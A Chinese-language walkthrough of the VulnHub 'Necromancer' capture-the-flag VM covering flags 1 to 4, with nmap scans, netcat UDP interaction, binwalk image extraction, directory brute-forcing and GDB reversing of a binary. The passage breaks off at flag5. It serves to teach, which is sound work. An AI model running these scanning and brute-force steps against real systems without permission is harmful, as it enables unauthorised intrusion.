---
title: "Necromancer Vulnhub靶场复现"
description: "一个综合的靶场"
slug: "vulnhub-necromancer"
pubDate: "2026-10-07"
type: "writeup"
tags: ["Vulnhub"]
lang: "zh-CN"
---

# Necromancer VulnHub靶场复现

## 靶场介绍

靶场地址 https://www.vulnhub.com/entry/the-necromancer-1,154/

介绍如下

```md
The Necromancer boot2root box was created for a recent SecTalks Brisbane CTF competition.

There are 11 flags to collect on your way to solving the challenging, and the difficulty level is considered as beginner.

The end goal is simple... destroy The Necromancer!

# Notes

- DHCP (Automatically assigned)
- IMPORTANT: The vm IS working as intended if you receive a successful DHCP lease as seen in the boot up sequence.
- The Necromancer VM MUST be on the same subnet as the attacking machine. Ideally both the boot2root VM and the attacking machine should be on the same HostOnly network. If you choose to use a physical box as the attacking machine, the boot2root VM must exist on the same network via a bridged interface.
```

### 靶场部署

默认是桥接，改为nat

## 信息收集

### 主机发现

```shell
sudo nmap -sn 10.10.10.0/24
```

获取靶机的ip为 10.10.10.102

### 端口扫描和漏洞探测

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ sudo nmap -sS -sV -O -sC -p- --min-rate 5000 10.10.10.102
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-06 11:22 -0400
Nmap scan report for 10.10.10.102
Host is up (0.00059s latency).
All 65535 scanned ports on 10.10.10.102 are in ignored states.
Not shown: 65535 filtered tcp ports (no-response)
MAC Address: 00:0C:29:27:05:E2 (VMware)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.88 seconds

```

所有端口被过滤（filtered），但 nmap 能拿到 MAC 地址

靶机是明确在线的，但 TCP 层面没有回应

Nmap 能通过二层（ARP）发现目标主机存在，但 TCP 探测包没有得到预期响应，因此端口被标记为 filtered。这可能是防火墙过滤，也可能是其他网络策略导致

ping一下看看

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ ping -c 3 10.10.10.102
PING 10.10.10.102 (10.10.10.102) 56(84) bytes of data.


--- 10.10.10.102 ping statistics ---
3 packets transmitted, 0 received, 100% packet loss, time 2122ms
```

100%丢包，可能是靶机的防火墙设定的，不过在这之前，可以先用nmap的udp功能探测一下

## 发现666端口开放UDP协议

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ sudo nmap -sU --top-ports 10000 10.10.10.102
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-06 11:35 -0400
Stats: 0:02:08 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
Nmap scan report for 10.10.10.102
Host is up (0.00070s latency).
Not shown: 9999 open|filtered udp ports (no-response)
PORT    STATE SERVICE
666/udp open  doom
MAC Address: 00:0C:29:27:05:E2 (VMware)
Nmap done: 1 IP address (1 host up) scanned in 188.83 seconds
```

UDP 扫描比 TCP 扫描更难判断状态。`open|filtered` 表示 Nmap 无法区分端口是真的开放还是被过滤，而 666/udp 获得了明确响应，因此最终被判断为 open

666端口是开放的，符合了Necromancer（死灵法师）这个地狱色彩的主题

利用这个端口做一个仔细扫描

```shell
sudo nmap -sU -p 666 -sV -sC 10.10.10.102

PORT    STATE SERVICE VERSION
666/udp open  doom?
| fingerprint-strings:
|   AFSVersionRequest, Citrix, DNS-SD, DNSStatusRequest, DNSVersionBindReq, DTLSSessionReq, Help, Kerberos, NBTStat, NTPRequest, NetMotionMobility, QUIC, RPCCheck, SIPOptions, SNMPv1public, SNMPv3GetRequest, Sqlping, sybaseanywhere, xdmcp:
|_    You gasp for air! Time is running out!
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port666-UDP:V=7.99%I=7%D=10/6%Time=6AC51699%P=x86_64-pc-linux-gnu%r(RPC
SF:Check,27,"You\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n
SF:")%r(DNSVersionBindReq,27,"You\x20gasp\x20for\x20air!\x20Time\x20is\x20
SF:running\x20out!\n")%r(DNSStatusRequest,27,"You\x20gasp\x20for\x20air!\x
SF:20Time\x20is\x20running\x20out!\n")%r(NBTStat,27,"You\x20gasp\x20for\x2
SF:0air!\x20Time\x20is\x20running\x20out!\n")%r(Help,27,"You\x20gasp\x20fo
SF:r\x20air!\x20Time\x20is\x20running\x20out!\n")%r(SIPOptions,27,"You\x20
SF:gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n")%r(Sqlping,27,"
SF:You\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n")%r(NTPRe
SF:quest,27,"You\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n
SF:")%r(SNMPv1public,27,"You\x20gasp\x20for\x20air!\x20Time\x20is\x20runni
SF:ng\x20out!\n")%r(SNMPv3GetRequest,27,"You\x20gasp\x20for\x20air!\x20Tim
SF:e\x20is\x20running\x20out!\n")%r(xdmcp,27,"You\x20gasp\x20for\x20air!\x
SF:20Time\x20is\x20running\x20out!\n")%r(AFSVersionRequest,27,"You\x20gasp
SF:\x20for\x20air!\x20Time\x20is\x20running\x20out!\n")%r(DNS-SD,27,"You\x
SF:20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n")%r(Citrix,27,
SF:"You\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n")%r(Kerb
SF:eros,27,"You\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n"
SF:)%r(sybaseanywhere,27,"You\x20gasp\x20for\x20air!\x20Time\x20is\x20runn
SF:ing\x20out!\n")%r(NetMotionMobility,27,"You\x20gasp\x20for\x20air!\x20T
SF:ime\x20is\x20running\x20out!\n")%r(DTLSSessionReq,27,"You\x20gasp\x20fo
SF:r\x20air!\x20Time\x20is\x20running\x20out!\n")%r(QUIC,27,"You\x20gasp\x
SF:20for\x20air!\x20Time\x20is\x20running\x20out!\n");
MAC Address: 00:0C:29:27:05:E2 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.25 seconds
```

nmap发送了 RPCCheck, DNSVersionBindReq, SNMPv1public, Sqlping 等十几种不同协议的数据包,无论 Nmap 发什么探测包,靶机只回复这一句You gasp for air! Time is running out!

说明这是一个自定义服务

目前为止我们只知道UDP 666 开放，且是一个非标准协议的自定义服务

那么我们想要与这个靶机交互不能直接通过tcp协议而是udp协议，UDP 协议是无连接的、不可靠的。UDP 本身是无连接协议。这里并不能仅凭 UDP 的特性断定服务一定会反向连接 TCP，但结合该靶机的行为，可以通过抓包观察它是否会主动向攻击机发起 TCP 连接。我们可以尝试让这个udp 666 端口主动往我们交互看看有没有结果

在两个终端上分别进行以下操作

```shell
nc -lvnp 4444
```

```shell
echo "test" | nc -u 10.10.10.102 666
```

nc -u：以 UDP 模式运行 Netcat

一开始可能没有信息回显，稍微等待一会

## 为什么是链接4444端口呢？

在这里我们利用tshark看看

```shell
tshark -i eth0 -n
```

```shell
   15 10.783315531 10.10.10.102 → 10.10.10.10  TCP 78 9065 → 4444 [SYN] Seq=0 Win=16384 Len=0 MSS=1460 SACK_PERM WS=8 TSval=143020430 TSecr=0
   16 10.783334820  10.10.10.10 → 10.10.10.102 TCP 54 4444 → 9065 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0
```

靶机会扫描本地子网中存活的机器。如果它发现有一台机器处于活动状态，就会尝试通过端口 4444 与这台机器连接

## 收到666链接并获取一段base64编码字符

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.102] 34039
...V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi...
```

这串字符符合base64编码的特征，下面是解码结果

## 获取flag1

```text
Welcome!

You find yourself staring towards the horizon, with nothing but silence surrounding you.
You look east, then south, then west, all you can see is a great wasteland of nothingness.

Turning to your north you notice a small flicker of light in the distance.
You walk north towards the flicker of light, only to be stopped by some type of invisible barrier.

The air around you begins to get thicker, and your heart begins to beat against your chest.
You turn to your left.. then to your right!  You are trapped!

You fumble through your pockets.. nothing!
You look down and see you are standing in sand.
Dropping to your knees you begin to dig frantically.

As you dig you notice the barrier extends underground!
Frantically you keep digging and digging until your nails suddenly catch on an object.

You dig further and discover a small wooden box.
flag1{e6078b9b1aac915d11b9fd59791030bf} is engraved on the lid.

You open the box, and find a parchment with the following written on it. "Chant the string of flag1 - u666"
```

## 获取flag2

故事中给了 flag1{e6078b9b1aac915d11b9fd59791030bf}，而羊皮纸上的提示是 Chant the string of flag1 - u666

flag的内容一个 32 位的十六进制字符串，这是典型的MD5 哈希值特征。

这个字符串符合 MD5 哈希的典型格式，可以使用在线数据库或字典进行反查

```text
opensesame
```

然后我们需要继续之前的操作

```shell
nc -lvnp 4444
```

```shell
echo "opensesame" | nc -u 10.10.10.102 666
```

最后实测不需要nc监听4444端口,只执行第二条就有回显，在这之前执行一直没反应，重启了下靶机解决问题

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ echo "opensesame" | nc -u 10.10.10.102 666


A loud crack of thunder sounds as you are knocked to your feet!

Dazed, you start to feel fresh air entering your lungs.

You are free!

In front of you written in the sand are the words:

flag2{c39cd4df8f2e35d20d92c2e44de5f7c6}

As you stand to your feet you notice that you can no longer see the flicker of light in the distance.

You turn frantically looking in all directions until suddenly, a murder of crows appear on the horizon.

As they get closer you can see one of the crows is grasping on to an object. As the sun hits the object, shards of light beam from its surface.

The birds get closer, and closer, and closer.

Staring up at the crows you can see they are in a formation.

Squinting your eyes from the light coming from the object, you can see the formation looks like the numeral 80.

As quickly as the birds appeared, they have left you once again.... alone... tortured by the deafening sound of silence.

666 is closed.
```

## 获取flag3

告诉我们乌鸦排成了数字 80 的形状，666端口已经关闭，说明可能是80端口开放了

重新使用nmap看看

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ sudo nmap -sS -sV -sC -p 80 10.10.10.102
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-06 12:47 -0400
Nmap scan report for 10.10.10.102
Host is up (0.00058s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    OpenBSD httpd
|_http-title: The Chasm
MAC Address: 00:0C:29:27:05:E2 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.01 seconds
```

### Web服务探测

```text
Hours have passed since you first started to follow the crows.

Silence continues to engulf you as you treck towards a mountain range on the horizon.

More times passes and you are now standing in front of a great chasm.

Across the chasm you can see a necromancer standing in the mouth of a cave, staring skyward at the circling crows.

As you step closer to the chasm, a rock dislodges from beneath your feet and falls into the dark depths.

The necromancer looks towards you with hollow eyes which can only be described as death.

He smirks in your direction, and suddenly a bright light momentarily blinds you.

The silence is broken by a blood curdling screech of a thousand birds, followed by the necromancers laughs fading as he decends into the cave!

The crows break their formation, some flying aimlessly in the air; others now motionless upon the ground.

The cave is now protected by a gaseous blue haze, and an organised pile of feathers lay before you.
```

还要一张图片，然后这个网页就没有内容了，查看源码发现一个目录

```shell
<img src="[/pics/pileoffeathers.jpg](http://10.10.10.102/pics/pileoffeathers.jpg)">
```

这个pics访问返回403，接下来目录爆破

### 目录爆破

```shell
┌──(kali㉿kali)-[~]
└─$ sudo dirb http://10.10.10.102
-----------------
DIRB v2.22
By The Dark Raver
-----------------
START_TIME: Tue Oct  6 14:32:59 2026
URL_BASE: http://10.10.10.102/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-----------------
GENERATED WORDS: 4612
---- Scanning URL: http://10.10.10.102/ ----
+ http://10.10.10.102/index.html (CODE:200|SIZE:1416)
==> DIRECTORY: http://10.10.10.102/pics/
---- Entering directory: http://10.10.10.102/pics/ ----
-----------------
END_TIME: Tue Oct  6 14:33:20 2026
DOWNLOADED: 9224 - FOUND: 1
```

目录爆破也是得到同样的内容

目前没有任何线索，先在后台挂一个字典更大的目录爆破

```shell
gobuster dir -u http://10.10.10.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak,zip -t 50
```

### 将80端口的照片下载下来静态分析

感觉除了照片其他线索都摸过了，为了防止掉进兔子洞，先把这张图片下载站下来静态分析

```shell
wget http://10.10.10.102/pics/pileoffeathers.jpg
```

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ file pileoffeathers.jpg && ls -la pileoffeathers.jpg
pileoffeathers.jpg: JPEG image data, Exif standard: [TIFF image data, little-endian, direntries=0], baseline, precision 8, 640x290, components 3
-rw-rw-r-- 1 kali kali 37289 2016年 5月 9日 pileoffeathers.jpg
```

是一个标准的 JPEG，带有 EXIF 数据。现在我们来深入分析它，看看里面有没有藏 flag 或线索。

1. 提取可打印字符串

```shell
strings pileoffeathers.jpg | head -80
```

没有直接可见的 flag 或明文提示。假如这是线索，那么线索要么藏在图片的像素/视觉内容里，要么是隐写数据。

2. 查看 EXIF 元数据

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ exiftool pileoffeathers.jpg
ExifTool Version Number         : 13.55
File Name                       : pileoffeathers.jpg
Directory                       : .
File Size                       : 37 kB
File Modification Date/Time     : 2016:05:09 07:44:22-04:00
File Access Date/Time           : 2026:10:06 14:44:45-04:00
File Inode Change Date/Time     : 2026:10:06 14:44:26-04:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
Quality                         : 60%
XMP Toolkit                     : Adobe XMP Core 5.0-c060 61.134777, 2010/02/12-17:32:00
Creator Tool                    : Adobe Photoshop CS5 Windows
Instance ID                     : xmp.iid:9678990A5A7D11E293DFC864BA726A9F
Document ID                     : xmp.did:9678990B5A7D11E293DFC864BA726A9F
Derived From Instance ID        : xmp.iid:967899085A7D11E293DFC864BA726A9F
Derived From Document ID        : xmp.did:967899095A7D11E293DFC864BA726A9F
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 640
Image Height                    : 290
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 640x290
Megapixels                      : 0.186
```

根据我的经验没发现什么特殊的

3. 检测是否嵌入了其他文件

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ binwalk pileoffeathers.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, EXIF standard
12            0xC             TIFF image data, little-endian offset of first image directory: 8
36994         0x9082          Zip archive data, at least v2.0 to extract, compressed size: 121, uncompressed size: 125, name: feathers.txt
37267         0x9193          End of Zip archive, footer length: 22

```

图片末尾嵌入了一个 **ZIP 压缩包**，里面包含一个 feathers.txt 文件。

加个-e参数提取一下

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ binwalk -e pileoffeathers.jpg
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
36994         0x9082          Zip archive data, at least v2.0 to extract, compressed size: 121, uncompressed size: 125, name: feathers.txt
WARNING: One or more files failed to extract: either no utility was found or it's unimplemented
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ ls -la _pileoffeathers.jpg.extracted/
总计 16
drwxrwxr-x 2 kali kali 4096 10月 6日 14:52 .
drwxrwxr-x 3 kali kali 4096 10月 6日 14:52 ..
-rw-rw-r-- 1 kali kali  295 10月 6日 14:52 9082.zip
-rw-r--r-- 1 kali kali  125 2016年 5月 8日 feathers.txt
```

提取成功，读取这个txt文本

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ cat _pileoffeathers.jpg.extracted/feathers.txt
ZmxhZzN7OWFkM2Y2MmRiN2I5MWMyOGI2ODEzNzAwMDM5NDYzOWZ9IC0gQ3Jvc3MgdGhlIGNoYXNtIGF0IC9hbWFnaWNicmlkZ2VhcHBlYXJzYXR0aGVjaGFzbQ==
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ echo "ZmxhZzN7OWFkM2Y2MmRiN2I5MWMyOGI2ODEzNzAwMDM5NDYzOWZ9IC0gQ3Jvc3MgdGhlIGNoYXNtIGF0IC9hbWFnaWNicmlkZ2VhcHBlYXJzYXR0aGVjaGFzbQ==" | base64 -d
flag3{9ad3f62db7b91c28b68137000394639f} - Cross the chasm at /amagicbridgeappearsatthechasm
```

读取又发现一个符合base64特征的字符，解码获得一个flag3，并且提供了一个新的目录

## 获取flag4

### 访问新路径

又是一段话并且附带一个照片

```text
You cautiously make your way across chasm.

You are standing on a snow covered plateau, surrounded by shear cliffs of ice and stone.

The cave before you is protected by some sort of spell cast by the necromancer.

You reach out to touch the gaseous blue haze, and can feel life being drawn from your soul the closer you get.

Hastily you take a few steps back away from the cave entrance.

There must be a magical item that could protect you from the necromancer's spell
```

### 对新目录进行目录爆破

```shell
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.10.102/amagicbridgeappearsatthechasm/FUZZ
```

得到这个talisman，翻译是护身符，符合当前境界

### 得到一个可执行文件

访问这个新路径提示要下载这个护身符

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ file talisman
talisman: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2b131df906087adf163f8cba1967b3d2766e639d, not stripped
```

一个未剥离符号32位的ELF可执行程序,假如要逆向，函数名都保留着，这对逆向分析极其有利

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ strings talisman
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
__isoc99_scanf
printf
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.0
PTRh
UWVS
t$,U
[^_]
;*2$"
GCC: (Debian 5.3.1-21) 5.3.1 20160528
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
completed.6597
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
talisman.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
__x86.get_pc_thunk.bx
printf@@GLIBC_2.0
_edata
chantToBreakSpell
unhide
myPrintf
__data_start
wearTalisman
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_start_main@@GLIBC_2.0
__libc_csu_init
_fp_hw
__bss_start
main
_Jv_RegisterClasses
__isoc99_scanf@@GLIBC_2.7
__TMC_END__
_ITM_registerTMCloneTable
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got.plt
.data
.bss
.comment
```

已经能看到几个关键函数名

main：主函数
wearTalisman：穿戴护身符
chantToBreakSpell：吟唱破咒
unhide：揭示/解蔽
myPrintf：自定义输出

这明显是一个交互式程序：你需要“穿戴护身符”并“吟唱”正确内容来打破死灵法师的咒语，从而获得 flag4 或下一步线索。

我们先动态看看

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ chmod +x talisman && ./talisman
You have found a talisman.

The talisman is cold to the touch, and has no words or symbols on it's surface.

Do you want to wear the talisman?  yes

Nothing happens.

```

反汇编看看

```shell
objdump -d -M intel talisman | sed -n '/<main>:/,/^$/p'
```

- -d：反汇编代码段。

- -M intel：使用 Intel 语法（更易读）。

- |：管道。

- `sed -n '/<main>:/,/^$/p'`：只打印 main 函数从开始到下一个空行之间的内容，避免输出过长。

main 函数非常简单，只调用了 wearTalisman，再反汇编这几个函数

```shell
objdump -d -M intel talisman | sed -n '/<wearTalisman>:/,/^$/p'
```

```shell
objdump -d -M intel talisman | sed -n '/<myPrintf>:/,/^$/p'
```

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ objdump -d -M intel talisman | sed -n '/<myPrintf>:/,/^$/p'
080484f4 <myPrintf>:
 80484f4:       55                      push   ebp
 80484f5:       89 e5                   mov    ebp,esp
 80484f7:       83 ec 08                sub    esp,0x8
 80484fa:       ff 75 08                push   DWORD PTR [ebp+0x8]
 80484fd:       e8 49 ff ff ff          call   804844b <unhide>
 8048502:       83 c4 04                add    esp,0x4
 8048505:       83 ec 08                sub    esp,0x8
 8048508:       ff 75 08                push   DWORD PTR [ebp+0x8]
 804850b:       68 b0 95 04 08          push   0x80495b0
 8048510:       e8 fb fd ff ff          call   8048310 <printf@plt>
 8048515:       83 c4 10                add    esp,0x10
 8048518:       83 ec 0c                sub    esp,0xc
 804851b:       ff 75 08                push   DWORD PTR [ebp+0x8]
 804851e:       e8 7a ff ff ff          call   804849d <hide>
 8048523:       83 c4 10                add    esp,0x10
 8048526:       90                      nop
 8048527:       c9                      leave
 8048528:       c3                      ret
```

注意到myPrintf 的逻辑很清晰：先调用 unhide 解密缓冲区，用 printf 打印，再调用 hide 重新加密回去。所以真正的解密算法在 unhide 里，hide 应该是它的逆操作

```shell
objdump -d -M intel talisman | sed -n '/<unhide>:/,/^$/p; /<hide>:/,/^$/p'
```

- unhide 的解密逻辑是：对字符串逐字节异或一个 4 字节循环密钥 [0xb5, 0xf2, 0x3c, 0xa1]，直到解密后的字节为 0 停止。

- wearTalisman 里硬编码了多段加密字符串，分别位于缓冲区偏移 0、0x64、0xc8、0x12c 处。我们需要把这些字节提取出来，然后分别解密。

不过用 GDB 动态调试是最直观的方式能直接看到解密后的字符串

```shell
gdb ./talisman
```

从反汇编里看到，myPrintf 在 0x8048510 处调用 printf@plt。在这个地址下断点，就能在每次打印前看到已解密的字符串

在 GDB 提示符下输入：

```shell
break *0x8048510
```

然后输入run

```shell
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0
$ebx   : 0xf7f94e34  →  0x00232d2c (",-#"?)
$ecx   : 0x0
$edx   : 0xa13cf200
$esp   : 0xffffcc70  →  0x080495b0  →  0x00007325 ("%s"?)
$ebp   : 0xffffcc88  →  0xffffce58  →  0xffffce68  →  0x08049530  →  <__libc_csu_init+0000> push ebp
$esi   : 0xf7f94e34  →  0x00232d2c (",-#"?)
$edi   : 0xffffce3c  →  0xffffdfcb  →  "/home/kali/Labs/Vulnhub/Necromancer/talisman"
$eip   : 0x08048510  →  0xfffdfbe8  →  0x00000000
$eflags: [zero carry PARITY ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcc70│+0x0000: 0x080495b0  →  0x00007325 ("%s"?)    ← $esp
0xffffcc74│+0x0004: 0xffffccac  →  "You have found a talisman.\n\n"
0xffffcc78│+0x0008: 0x08048502  →  <myPrintf+000e> add esp, 0x4
0xffffcc7c│+0x000c: 0xffffccc8  →  0x00000000
0xffffcc80│+0x0010: 0x00000000
0xffffcc84│+0x0014: 0x00000000
0xffffcc88│+0x0018: 0xffffce58  →  0xffffce68  →  0x08049530  →  <__libc_csu_init+0000> push ebp         ← $ebp
0xffffcc8c│+0x001c: 0x080489b3  →  <wearTalisman+048a> add esp, 0x10
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048505 <myPrintf+0011>  sub    esp, 0x8
    0x8048508 <myPrintf+0014>  push   DWORD PTR [ebp+0x8]
    0x804850b <myPrintf+0017>  push   0x80495b0
●→  0x8048510 <myPrintf+001c>  call   0x8048310 <printf@plt>
   ↳   0x8048310 <printf@plt+0000> jmp    DWORD PTR ds:0x804a880
       0x8048316 <printf@plt+0006> push   0x0
       0x804831b <printf@plt+000b> jmp    0x8048300
       0x8048320 <__libc_start_main@plt+0000> jmp    DWORD PTR ds:0x804a884
       0x8048326 <__libc_start_main@plt+0006> push   0x8
       0x804832b <__libc_start_main@plt+000b> jmp    0x8048300
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
printf@plt (
   [sp + 0x0] = 0x080495b0 → 0x00007325 ("%s"?),
   [sp + 0x4] = 0xffffccac → "You have found a talisman.\n\n",
   [sp + 0x8] = 0x08048502 → <myPrintf+000e> add esp, 0x4,
   [sp + 0xc] = 0xffffccc8 → 0x00000000
)
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "talisman", stopped 0x8048510 in myPrintf (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048510 → myPrintf()
[#1] 0x80489b3 → wearTalisman()
[#2] 0x8048a29 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

已经在第一个断点停住了，栈上能看到第一段解密后的字符串 "You have found a talisman.\n\n"

```shell
continue
```

重复3次continue

未发现什么内容，输入 quit 退出

说明输入不参与任何判断，纯剧情烟雾弹

而 chantToBreakSpell() 位于 0x8048a37，全程序没有任何 call 指向它——隐藏死函数，

真 flag 就藏在里面（典型的函数没被引用，得手动调用套路）。

再调试一下

```shell
gdb ./talisman
break wearTalisman
run
jump chantToBreakSpell
```

jump 会修改当前执行位置，使程序从指定地址继续执行。这里由于 chantToBreakSpell() 本身没有被调用，但函数已经存在于 ELF 中，因此可以直接跳转到该函数执行。

获取到flag

```shell
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
You fall to your knees.. weak and weary.
Looking up you can see the spell is still protecting the cave entrance.
The talisman is now almost too hot to touch!
Turning it over you see words now etched into the surface:
flag4{ea50536158db50247e110a6c89fcf3d3}
Chant these words at u31337
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
```

## 获取flag5

得到的新提示是把 flag4 的内容发送到 UDP 31337 端口

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
